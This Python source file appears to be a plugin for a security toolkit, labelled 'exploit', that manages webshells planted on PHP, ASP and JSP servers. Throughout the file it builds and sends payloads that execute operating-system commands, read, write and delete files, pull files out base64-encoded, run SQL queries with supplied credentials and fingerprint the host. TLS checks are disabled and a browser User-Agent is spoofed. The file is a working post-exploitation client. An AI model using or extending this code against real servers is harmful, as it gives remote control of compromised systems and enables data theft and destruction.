"""WebShell 管理插件 v2.1.0 - 会话模式 + 单次模式"""

import base64
from typing import Any, AsyncIterator

import httpx

from netkitx_sdk import PluginBase, PluginEvent, PluginMeta
from netkitx_sdk.base import SessionPlugin

_MARKER = "NETKITX_OK"

_OP_LABELS = {
    "test": "连接测试",
    "exec": "命令执行",
    "listdir": "列出目录",
    "readfile": "读取文件",
    "writefile": "写入文件",
    "delete": "删除文件",
    "download": "下载文件",
    "fileinfo": "文件信息",
    "sysinfo": "系统信息",
    "dbquery": "数据库查询",
    "detect": "Shell 检测",
}


class WebShellPlugin(SessionPlugin):
    """WebShell 管理插件 — 支持会话模式"""

    meta = PluginMeta(
        name="webshell",
        version="2.1.0",
        description="WebShell 管理工具 - 连接测试/命令执行/文件管理/数据库操作/Shell检测",
        category="exploit",
        engine="python",
        mode="session",
    )

    def __init__(self):
        super().__init__()
        self.client: httpx.AsyncClient | None = None

    # ── session lifecycle ─────────────────────────────────────────────

    async def on_session_start(self, params: dict[str, Any]) -> dict[str, Any]:
        """Initialize session: validate connection and return initial state."""
        url = params.get("url", "").strip()
        password = params.get("password", "").strip()
        shell_type = params.get("shell_type", "php_eval")
        timeout = int(params.get("timeout", 15))

        return {
            "url": url,
            "password": password,
            "shell_type": shell_type,
            "timeout": timeout,
            "cwd": "/",
        }

    async def on_message(
        self, session_id: str, message: dict[str, Any], state: dict[str, Any]
    ) -> AsyncIterator[PluginEvent]:
        """Handle a command within the session."""
        command = message.get("command", "").strip()
        if not command:
            yield PluginEvent(type="error", data={"error": "命令不能为空"})
            return

        url = state["url"]
        password = state["password"]
        shell_type = state["shell_type"]
        timeout = state.get("timeout", 15)
        cwd = state.get("cwd", "/")

        client = httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=True,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
            },
        )

        try:
            # Handle cd command — update cwd in state
            if command.startswith("cd "):
                target = command[3:].strip()
                if target.startswith("/"):
                    new_cwd = target
                else:
                    new_cwd = f"{cwd.rstrip('/')}/{target}"
                state["cwd"] = new_cwd
                yield PluginEvent(type="result", data={"output": f"cd → {new_cwd}", "cwd": new_cwd})
                return

            # Prepend cwd to command
            full_cmd = f"cd {cwd} && {command}" if cwd != "/" else command
            payload = self._build_payload(shell_type, "exec", command=full_cmd)
            resp = await client.post(url, data={password: payload})
            output = resp.text.strip()

            yield PluginEvent(
                type="result",
                data={"output": output if output else "(无输出)", "cwd": cwd},
            )
        except httpx.TimeoutException:
            yield PluginEvent(type="error", data={"error": "连接超时"})
        except httpx.ConnectError as e:
            yield PluginEvent(type="error", data={"error": f"连接失败: {e}"})
        except Exception as e:
            yield PluginEvent(type="error", data={"error": f"执行失败: {e}"})
        finally:
            await client.aclose()

    async def on_session_end(self, session_id: str, state: dict[str, Any]) -> None:
        pass

    # ── execute ──────────────────────────────────────────────────────

    async def execute(self, params: dict[str, Any]) -> AsyncIterator[PluginEvent]:
        url = params["url"].strip()
        password = params["password"].strip()
        shell_type = params.get("shell_type", "php_eval")
        operation = params.get("operation", "test")
        timeout = int(params.get("timeout", 15))

        yield PluginEvent(type="log", data={"msg": f"[*] Target: {url}"})
        yield PluginEvent(
            type="log",
            data={"msg": f"[*] Shell: {shell_type}, Operation: {operation}"},
        )

        self.client = httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=True,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
            },
        )

        try:
            # detect 走独立流程
            if operation == "detect":
                async for event in self._detect_shell(url, password):
                    yield event
                return

            # 校验并提取参数
            kwargs, error = self._extract_kwargs(operation, params)
            if error:
                yield PluginEvent(type="error", data={"error": error})
                return

            # 构建 payload → 发送 → 格式化
            yield PluginEvent(type="progress", data={"percent": 30, "msg": f"执行: {operation}..."})
            payload = self._build_payload(shell_type, operation, **kwargs)
            resp = await self.client.post(url, data={password: payload})

            output = resp.text if operation == "readfile" else resp.text.strip()
            result = self._format_result(operation, output, kwargs)

            yield PluginEvent(type="result", data=result)
            yield PluginEvent(type="log", data={"msg": f"[+] {operation} 完成"})

        except httpx.TimeoutException:
            yield PluginEvent(type="error", data={"error": "连接超时"})
        except httpx.ConnectError as e:
            yield PluginEvent(type="error", data={"error": f"连接失败: {e}"})
        except Exception as e:
            yield PluginEvent(type="error", data={"error": f"执行失败: {e}"})
        finally:
            if self.client:
                await self.client.aclose()

        yield PluginEvent(type="progress", data={"percent": 100, "msg": "完成"})

    # ── detect ───────────────────────────────────────────────────────

    async def _detect_shell(self, url: str, password: str) -> AsyncIterator[PluginEvent]:
        yield PluginEvent(type="progress", data={"percent": 10, "msg": "自动检测 Shell 类型..."})
        types = ["php_eval", "php_assert", "php_base64", "asp_eval", "jsp_eval"]
        for i, st in enumerate(types):
            yield PluginEvent(type="log", data={"msg": f"[*] 尝试: {st}"})
            yield PluginEvent(
                type="progress",
                data={"percent": 10 + (i + 1) * 16, "msg": f"检测: {st}"},
            )
            try:
                payload = self._build_payload(st, "test")
                resp = await self.client.post(url, data={password: payload})
                if _MARKER in resp.text:
                    yield PluginEvent(
                        type="result",
                        data={
                            "operation": "Shell 检测",
                            "status": "✅ 检测成功",
                            "output": f"检测到 Shell 类型: {st}",
                            "details": f"HTTP {resp.status_code}",
                        },
                    )
                    yield PluginEvent(type="log", data={"msg": f"[+] 检测到: {st}"})
                    return
            except Exception:
                continue

        yield PluginEvent(
            type="result",
            data={
                "operation": "Shell 检测",
                "status": "❌ 未检测到",
                "output": "所有 Shell 类型均未响应",
                "details": "请确认 URL 和密码是否正确",
            },
        )

    # ── param extraction ─────────────────────────────────────────────

    def _extract_kwargs(self, operation: str, params: dict) -> tuple[dict | None, str | None]:
        if operation in ("test", "sysinfo"):
            return {}, None

        if operation == "exec":
            command = params.get("command", "").strip()
            if not command:
                return None, "命令不能为空"
            return {"command": command}, None

        if operation == "listdir":
            return {"path": params.get("path", ".").strip()}, None

        if operation in ("readfile", "delete", "download", "fileinfo"):
            path = params.get("path", "").strip()
            if not path:
                return None, "路径不能为空"
            return {"path": path}, None

        if operation == "writefile":
            path = params.get("path", "").strip()
            content = params.get("content", "")
            if not path:
                return None, "文件路径不能为空"
            return {
                "path": path,
                "content_b64": base64.b64encode(content.encode()).decode(),
            }, None

        if operation == "dbquery":
            sql = params.get("sql", "").strip()
            if not sql:
                return None, "SQL 语句不能为空"
            return {
                "db_host": params.get("db_host", "localhost").strip(),
                "db_user": params.get("db_user", "root").strip(),
                "db_pass": params.get("db_pass", "").strip(),
                "db_name": params.get("db_name", "").strip(),
                "sql": sql,
                "sql_b64": base64.b64encode(sql.encode()).decode(),
            }, None

        return None, f"未知操作: {operation}"

    # ── payload dispatcher ───────────────────────────────────────────

    def _build_payload(self, shell_type: str, operation: str, **kwargs) -> str:
        if shell_type.startswith("php"):
            raw = self._php_payload(operation, **kwargs)
        elif shell_type.startswith("asp"):
            raw = self._asp_payload(operation, **kwargs)
        elif shell_type.startswith("jsp"):
            raw = self._jsp_payload(operation, **kwargs)
        else:
            raise ValueError(f"不支持的 shell 类型: {shell_type}")

        if shell_type == "php_base64":
            return base64.b64encode(raw.encode()).decode()
        return raw

    # ── PHP payloads ─────────────────────────────────────────────────

    def _php_payload(self, op: str, **kw) -> str:
        if op == "test":
            return f"echo '{_MARKER}';"

        if op == "exec":
            cmd = kw["command"]
            return f"system('{cmd}');"

        if op == "listdir":
            p = kw["path"]
            return (
                f"$d='{p}';"
                "if(is_dir($d)){"
                "$f=scandir($d);"
                "foreach($f as $i){"
                "if($i!='.'&&$i!='..'){"
                "$p=$d.'/'.$i;"
                "$t=is_dir($p)?'[DIR]':'[FILE]';"
                "$s=is_file($p)?filesize($p):0;"
                'echo "$t $i ($s bytes)\\n";'
                "}}}"
                "else{echo '目录不存在';}"
            )

        if op == "readfile":
            p = kw["path"]
            return (
                f"$f='{p}';"
                "if(file_exists($f)){echo file_get_contents($f);}"
                "else{echo '文件不存在';}"
            )

        if op == "writefile":
            p, b64 = kw["path"], kw["content_b64"]
            return (
                f"$f='{p}';"
                f"$c=base64_decode('{b64}');"
                "$r=file_put_contents($f,$c);"
                'if($r!==false){echo "写入成功: $r bytes";}'
                "else{echo '写入失败';}"
            )

        if op == "delete":
            p = kw["path"]
            return (
                f"$p='{p}';"
                "if(is_file($p)){echo unlink($p)?'删除成功':'删除失败';}"
                "elseif(is_dir($p)){echo rmdir($p)?'删除成功':'删除失败(目录非空?)';}"
                "else{echo '路径不存在';}"
            )

        if op == "download":
            p = kw["path"]
            return (
                f"$f='{p}';"
                "if(file_exists($f)){echo base64_encode(file_get_contents($f));}"
                "else{echo 'FILE_NOT_FOUND';}"
            )

        if op == "fileinfo":
            p = kw["path"]
            return (
                f"$f='{p}';"
                "if(file_exists($f)){"
                "$s=stat($f);"
                "echo 'Size: '.$s['size'].\" bytes\\n\";"
                "echo 'Perms: '.substr(sprintf('%o',fileperms($f)),-4).\"\\n\";"
                "echo 'Owner: '.$s['uid'].\"\\n\";"
                "echo 'Group: '.$s['gid'].\"\\n\";"
                "echo 'Modified: '.date('Y-m-d H:i:s',$s['mtime']).\"\\n\";"
                "echo 'Accessed: '.date('Y-m-d H:i:s',$s['atime']).\"\\n\";"
                "echo 'Type: '.(is_dir($f)?'directory':'file').\"\\n\";"
                "}"
                "else{echo '路径不存在';}"
            )

        if op == "sysinfo":
            return (
                "echo 'OS: '.PHP_OS.\"\\n\";"
                "echo 'PHP: '.PHP_VERSION.\"\\n\";"
                "echo 'Server: '.$_SERVER['SERVER_SOFTWARE'].\"\\n\";"
                "echo 'DocRoot: '.$_SERVER['DOCUMENT_ROOT'].\"\\n\";"
                "echo 'User: '.get_current_user().\"\\n\";"
                "echo 'DisabledFunc: '.ini_get('disable_functions').\"\\n\";"
            )

        if op == "dbquery":
            h, u, pw, db = kw["db_host"], kw["db_user"], kw["db_pass"], kw["db_name"]
            sql_b64 = kw["sql_b64"]
            return (
                f"$c=new mysqli('{h}','{u}','{pw}','{db}');"
                "if($c->connect_error){echo 'Connect failed: '.$c->connect_error;exit;}"
                "$c->set_charset('utf8');"
                f"$sql=base64_decode('{sql_b64}');"
                "$r=$c->query($sql);"
                "if($r===false){echo 'Query error: '.$c->error;}"
                "elseif($r===true){echo 'OK, affected: '.$c->affected_rows;}"
                "else{"
                "$cols=[];"
                "while($f=$r->fetch_field()){$cols[]=$f->name;}"
                'echo implode("\\t",$cols)."\\n";'
                "echo str_repeat('-',40).\"\\n\";"
                "while($row=$r->fetch_assoc()){"
                "$vals=[];"
                "foreach($cols as $col){$vals[]=$row[$col]??'NULL';}"
                'echo implode("\\t",$vals)."\\n";'
                "}}"
                "$c->close();"
            )

        raise ValueError(f"PHP 不支持的操作: {op}")

    # ── ASP payloads ─────────────────────────────────────────────────

    def _asp_payload(self, op: str, **kw) -> str:
        if op == "test":
            return f'Response.Write("{_MARKER}")'

        if op == "exec":
            cmd = kw["command"]
            return (
                'Set s=CreateObject("WScript.Shell")\n'
                f'Set e=s.Exec("cmd /c {cmd}")\n'
                "Response.Write(e.StdOut.ReadAll())"
            )

        if op == "listdir":
            p = kw["path"]
            return (
                'Set fso=CreateObject("Scripting.FileSystemObject")\n'
                f'If fso.FolderExists("{p}") Then\n'
                f'  Set folder=fso.GetFolder("{p}")\n'
                "  For Each sf In folder.SubFolders\n"
                '    Response.Write("[DIR] " & sf.Name & " (0 bytes)" & vbCrLf)\n'
                "  Next\n"
                "  For Each f In folder.Files\n"
                '    Response.Write("[FILE] " & f.Name & " (" & f.Size & " bytes)" & vbCrLf)\n'
                "  Next\n"
                "Else\n"
                '  Response.Write("目录不存在")\n'
                "End If"
            )

        if op == "readfile":
            p = kw["path"]
            return (
                'Set fso=CreateObject("Scripting.FileSystemObject")\n'
                f'If fso.FileExists("{p}") Then\n'
                '  Set stream=CreateObject("ADODB.Stream")\n'
                "  stream.Type=2\n"
                '  stream.Charset="utf-8"\n'
                "  stream.Open\n"
                f'  stream.LoadFromFile "{p}"\n'
                "  Response.Write(stream.ReadText)\n"
                "  stream.Close\n"
                "Else\n"
                '  Response.Write("文件不存在")\n'
                "End If"
            )

        if op == "writefile":
            p, b64 = kw["path"], kw["content_b64"]
            return (
                "Function B64Dec(s)\n"
                '  Dim xml: Set xml=CreateObject("MSXML2.DOMDocument")\n'
                '  Dim node: Set node=xml.createElement("b64")\n'
                '  node.dataType="bin.base64"\n'
                "  node.text=s\n"
                '  Dim st: Set st=CreateObject("ADODB.Stream")\n'
                "  st.Type=1: st.Open: st.Write node.nodeTypedValue\n"
                "  st.Position=0: st.Type=2\n"
                '  st.Charset="utf-8"\n'
                "  B64Dec=st.ReadText: st.Close\n"
                "End Function\n"
                'Set stream=CreateObject("ADODB.Stream")\n'
                'stream.Type=2: stream.Charset="utf-8": stream.Open\n'
                f'stream.WriteText B64Dec("{b64}")\n'
                f'stream.SaveToFile "{p}", 2\n'
                "stream.Close\n"
                'Response.Write("写入成功")'
            )

        if op == "delete":
            p = kw["path"]
            return (
                'Set fso=CreateObject("Scripting.FileSystemObject")\n'
                f'If fso.FileExists("{p}") Then\n'
                f'  fso.DeleteFile "{p}", True\n'
                '  Response.Write("删除成功")\n'
                f'ElseIf fso.FolderExists("{p}") Then\n'
                f'  fso.DeleteFolder "{p}", True\n'
                '  Response.Write("删除成功")\n'
                "Else\n"
                '  Response.Write("路径不存在")\n'
                "End If"
            )

        if op == "download":
            p = kw["path"]
            return (
                'Set fso=CreateObject("Scripting.FileSystemObject")\n'
                f'If fso.FileExists("{p}") Then\n'
                '  Set stream=CreateObject("ADODB.Stream")\n'
                "  stream.Type=1: stream.Open\n"
                f'  stream.LoadFromFile "{p}"\n'
                "  Dim bytes: bytes=stream.Read: stream.Close\n"
                '  Dim xml: Set xml=CreateObject("MSXML2.DOMDocument")\n'
                '  Dim node: Set node=xml.createElement("b64")\n'
                '  node.dataType="bin.base64"\n'
                "  node.nodeTypedValue=bytes\n"
                "  Response.Write(node.text)\n"
                "Else\n"
                '  Response.Write("FILE_NOT_FOUND")\n'
                "End If"
            )

        if op == "fileinfo":
            p = kw["path"]
            return (
                'Set fso=CreateObject("Scripting.FileSystemObject")\n'
                f'If fso.FileExists("{p}") Then\n'
                f'  Set f=fso.GetFile("{p}")\n'
                '  Response.Write("Size: " & f.Size & " bytes" & vbCrLf)\n'
                '  Response.Write("Created: " & f.DateCreated & vbCrLf)\n'
                '  Response.Write("Modified: " & f.DateLastModified & vbCrLf)\n'
                '  Response.Write("Accessed: " & f.DateLastAccessed & vbCrLf)\n'
                '  Response.Write("Type: " & f.Type & vbCrLf)\n'
                '  attr=""\n'
                '  If f.Attributes And 1 Then attr=attr & "ReadOnly "\n'
                '  If f.Attributes And 2 Then attr=attr & "Hidden "\n'
                '  If f.Attributes And 4 Then attr=attr & "System "\n'
                '  Response.Write("Attributes: " & attr & vbCrLf)\n'
                f'ElseIf fso.FolderExists("{p}") Then\n'
                f'  Set f=fso.GetFolder("{p}")\n'
                '  Response.Write("Size: " & f.Size & " bytes" & vbCrLf)\n'
                '  Response.Write("Created: " & f.DateCreated & vbCrLf)\n'
                '  Response.Write("Modified: " & f.DateLastModified & vbCrLf)\n'
                '  Response.Write("Type: directory" & vbCrLf)\n'
                "Else\n"
                '  Response.Write("路径不存在")\n'
                "End If"
            )

        if op == "sysinfo":
            return (
                'Set sh=CreateObject("WScript.Shell")\n'
                'Set env=sh.Environment("Process")\n'
                'Response.Write("OS: " & env("OS") & vbCrLf)\n'
                'Response.Write("ComputerName: " & env("COMPUTERNAME") & vbCrLf)\n'
                'Response.Write("UserName: " & env("USERNAME") & vbCrLf)\n'
                'Response.Write("SystemRoot: " & env("SYSTEMROOT") & vbCrLf)\n'
                'Response.Write("Processors: " & env("NUMBER_OF_PROCESSORS") & vbCrLf)\n'
                'Response.Write("Architecture: " & env("PROCESSOR_ARCHITECTURE") & vbCrLf)\n'
                'Response.Write("TempDir: " & env("TEMP") & vbCrLf)'
            )

        if op == "dbquery":
            h, u, pw, db = kw["db_host"], kw["db_user"], kw["db_pass"], kw["db_name"]
            sql = kw["sql"]
            conn = f"Driver={{SQL Server}};Server={h};Database={db};Uid={u};Pwd={pw};"
            return (
                'Set conn=CreateObject("ADODB.Connection")\n'
                f'conn.Open "{conn}"\n'
                f'Set rs=conn.Execute("{sql}")\n'
                "If Not rs.EOF Then\n"
                "  For i=0 To rs.Fields.Count-1\n"
                "    Response.Write(rs.Fields(i).Name & vbTab)\n"
                "  Next\n"
                '  Response.Write(vbCrLf & String(40,"-") & vbCrLf)\n'
                "  Do While Not rs.EOF\n"
                "    For i=0 To rs.Fields.Count-1\n"
                "      Response.Write(rs.Fields(i).Value & vbTab)\n"
                "    Next\n"
                "    Response.Write(vbCrLf)\n"
                "    rs.MoveNext\n"
                "  Loop\n"
                "Else\n"
                '  Response.Write("OK, no rows returned")\n'
                "End If\n"
                "rs.Close: conn.Close"
            )

        raise ValueError(f"ASP 不支持的操作: {op}")

    # ── JSP payloads ─────────────────────────────────────────────────

    def _jsp_payload(self, op: str, **kw) -> str:
        if op == "test":
            return f'out.print("{_MARKER}");'

        if op == "exec":
            cmd = kw["command"]
            return (
                'String os=System.getProperty("os.name").toLowerCase();\n'
                "Process p;\n"
                'if(os.contains("win")){\n'
                f'  p=Runtime.getRuntime().exec(new String[]{{"cmd","/c","{cmd}"}});\n'
                "} else {\n"
                f'  p=Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c","{cmd}"}});\n'
                "}\n"
                "java.io.BufferedReader br=new java.io.BufferedReader("
                "new java.io.InputStreamReader(p.getInputStream()));\n"
                "String line;\n"
                "while((line=br.readLine())!=null){out.println(line);}\n"
                "br.close();"
            )

        if op == "listdir":
            p = kw["path"]
            return (
                f'java.io.File dir=new java.io.File("{p}");\n'
                "if(dir.isDirectory()){\n"
                "  java.io.File[] files=dir.listFiles();\n"
                "  if(files!=null){\n"
                "    for(java.io.File f:files){\n"
                '      String t=f.isDirectory()?"[DIR]":"[FILE]";\n'
                "      long s=f.isFile()?f.length():0;\n"
                '      out.println(t+" "+f.getName()+" ("+s+" bytes)");\n'
                "    }\n"
                "  }\n"
                "} else {\n"
                '  out.print("目录不存在");\n'
                "}"
            )

        if op == "readfile":
            p = kw["path"]
            return (
                f'java.io.File f=new java.io.File("{p}");\n'
                "if(f.exists()){\n"
                "  java.io.BufferedReader br=new java.io.BufferedReader("
                "new java.io.FileReader(f));\n"
                "  String line;\n"
                "  while((line=br.readLine())!=null){out.println(line);}\n"
                "  br.close();\n"
                "} else {\n"
                '  out.print("文件不存在");\n'
                "}"
            )

        if op == "writefile":
            p, b64 = kw["path"], kw["content_b64"]
            return (
                f'byte[] data=java.util.Base64.getDecoder().decode("{b64}");\n'
                f'java.io.FileOutputStream fos=new java.io.FileOutputStream("{p}");\n'
                "fos.write(data); fos.close();\n"
                'out.print("写入成功: "+data.length+" bytes");'
            )

        if op == "delete":
            p = kw["path"]
            return (
                f'java.io.File f=new java.io.File("{p}");\n'
                "if(f.exists()){\n"
                '  out.print(f.delete()?"删除成功":"删除失败");\n'
                "} else {\n"
                '  out.print("路径不存在");\n'
                "}"
            )

        if op == "download":
            p = kw["path"]
            return (
                f'java.io.File f=new java.io.File("{p}");\n'
                "if(f.exists()){\n"
                "  java.io.FileInputStream fis=new java.io.FileInputStream(f);\n"
                "  byte[] data=new byte[(int)f.length()];\n"
                "  fis.read(data); fis.close();\n"
                "  out.print(java.util.Base64.getEncoder().encodeToString(data));\n"
                "} else {\n"
                '  out.print("FILE_NOT_FOUND");\n'
                "}"
            )

        if op == "fileinfo":
            p = kw["path"]
            return (
                f'java.io.File f=new java.io.File("{p}");\n'
                "if(f.exists()){\n"
                '  out.println("Size: "+f.length()+" bytes");\n'
                '  out.println("Modified: "+new java.text.SimpleDateFormat('
                '"yyyy-MM-dd HH:mm:ss").format(new java.util.Date(f.lastModified())));\n'
                '  out.println("Readable: "+f.canRead());\n'
                '  out.println("Writable: "+f.canWrite());\n'
                '  out.println("Executable: "+f.canExecute());\n'
                '  out.println("Type: "+(f.isDirectory()?"directory":"file"));\n'
                '  out.println("AbsPath: "+f.getAbsolutePath());\n'
                "} else {\n"
                '  out.print("路径不存在");\n'
                "}"
            )

        if op == "sysinfo":
            return (
                'out.println("OS: "+System.getProperty("os.name")+" "'
                '+System.getProperty("os.version"));\n'
                'out.println("Arch: "+System.getProperty("os.arch"));\n'
                'out.println("Java: "+System.getProperty("java.version"));\n'
                'out.println("User: "+System.getProperty("user.name"));\n'
                'out.println("Home: "+System.getProperty("user.home"));\n'
                'out.println("Dir: "+System.getProperty("user.dir"));\n'
                "Runtime rt=Runtime.getRuntime();\n"
                'out.println("Memory: "+rt.freeMemory()/1024/1024+"MB free / "'
                '+rt.totalMemory()/1024/1024+"MB total");\n'
                'out.println("Processors: "+rt.availableProcessors());'
            )

        if op == "dbquery":
            h, u, pw, db = kw["db_host"], kw["db_user"], kw["db_pass"], kw["db_name"]
            sql_b64 = kw["sql_b64"]
            jdbc = f"jdbc:mysql://{h}/{db}"
            return (
                'Class.forName("com.mysql.jdbc.Driver");\n'
                "java.sql.Connection conn=java.sql.DriverManager.getConnection("
                f'"{jdbc}","{u}","{pw}");\n'
                "java.sql.Statement stmt=conn.createStatement();\n"
                f'String sql=new String(java.util.Base64.getDecoder().decode("{sql_b64}"));\n'
                "boolean hasRS=stmt.execute(sql);\n"
                "if(hasRS){\n"
                "  java.sql.ResultSet rs=stmt.getResultSet();\n"
                "  java.sql.ResultSetMetaData meta=rs.getMetaData();\n"
                "  int cols=meta.getColumnCount();\n"
                '  for(int i=1;i<=cols;i++){out.print(meta.getColumnName(i)+"\\t");}\n'
                "  out.println();\n"
                '  for(int i=0;i<40;i++){out.print("-");}\n'
                "  out.println();\n"
                "  while(rs.next()){\n"
                '    for(int i=1;i<=cols;i++){out.print(rs.getString(i)+"\\t");}\n'
                "    out.println();\n"
                "  }\n"
                "  rs.close();\n"
                "} else {\n"
                '  out.print("OK, affected: "+stmt.getUpdateCount());\n'
                "}\n"
                "stmt.close(); conn.close();"
            )

        raise ValueError(f"JSP 不支持的操作: {op}")

    # ── result formatting ────────────────────────────────────────────

    def _format_result(self, operation: str, output: str, kwargs: dict) -> dict:
        result = {
            "operation": _OP_LABELS.get(operation, operation),
            "status": "✅ 完成",
            "output": output if output else "(无输出)",
            "details": "",
        }

        if operation == "test":
            if _MARKER in output:
                result["status"] = "✅ 成功"
                result["output"] = "Shell 连接正常"
            else:
                result["status"] = "❌ 失败"
                result["output"] = "未检测到预期响应"
                result["details"] = output[:200]
            return result

        if operation == "exec":
            result["details"] = f"命令: {kwargs['command']}"
        elif operation == "listdir":
            result["details"] = f"路径: {kwargs['path']}"
        elif operation == "readfile":
            if len(output) > 1000:
                result["output"] = output[:1000] + "..."
            result["details"] = f"路径: {kwargs['path']}, 大小: {len(output)} bytes"
        elif operation == "writefile":
            result["details"] = f"路径: {kwargs['path']}"
        elif operation in ("delete", "fileinfo"):
            result["details"] = f"路径: {kwargs['path']}"
        elif operation == "download":
            result["details"] = f"路径: {kwargs['path']}"
            if output == "FILE_NOT_FOUND":
                result["status"] = "❌ 失败"
                result["output"] = "文件不存在"
            else:
                try:
                    decoded = base64.b64decode(output)
                    result["output"] = f"文件大小: {len(decoded)} bytes (base64 编码)"
                    result["details"] += f", base64 长度: {len(output)}"
                except Exception:
                    result["output"] = output[:200]
        elif operation == "dbquery":
            result["details"] = f"SQL: {kwargs['sql']}"

        return result


# 导出插件实例
plugin = WebShellPlugin()
